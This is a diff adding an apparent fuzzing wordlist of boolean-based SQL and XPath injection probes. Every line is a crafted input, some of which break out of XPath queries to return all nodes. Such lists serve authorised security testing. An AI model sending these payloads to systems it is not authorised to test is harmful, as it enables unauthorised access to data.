@@ -1,0 +1,27 @@
+' and '1'='1
+' and '1'='2
+" and "1"="1
+" and "1"="2
+and 1=1
+and 1=2
+and not 1=2
+and 1=2
+1=1
+1=2
+true()
+false()
+.[true()]
+.[false()]
+[true()]
+[false()]
+//*
+' ) and true() and '1'='1
+' ) and false() and '1'='1
+" ) and true() and "1"="1
+" ) and false() and "1"="1
+' ) and true() and string('1'='1)
+' ) and false() and string('1'='1)
+" ) and true() and string("1"="1)
+" ) and false() and string("1"="1)
+'] | //*[true()] | ['a'='a
+"] | //*[true()] | ["a"="a
